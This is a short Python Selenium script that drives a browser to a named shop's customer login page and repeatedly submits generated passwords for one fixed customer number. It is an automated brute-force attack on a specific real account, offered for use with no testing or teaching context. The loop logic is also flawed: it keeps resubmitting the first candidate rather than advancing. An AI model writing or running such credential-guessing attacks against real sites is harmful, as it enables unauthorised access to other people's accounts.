from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import itertools
import time

PATH = "C:\Program Files (x86)\msedgedriver.exe"
driver = webdriver.Edge(PATH)

dicc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
cantMin = 6
val = []
cont = 1

driver.get("https://garveshop.com/my_garve/index.php")

for tam in range (cantMin, len(dicc)):
    for password in itertools.product(dicc, repeat=tam):
        while cont < 101:
            print('{}: {}'.format(cont, password))
            driver.find_element_by_id("numero_cliente").send_keys("19685")
            driver.find_element_by_id("pass").send_keys(password)
            driver.find_element_by_id("entrar").click()
            time.sleep(2)
            cont += 1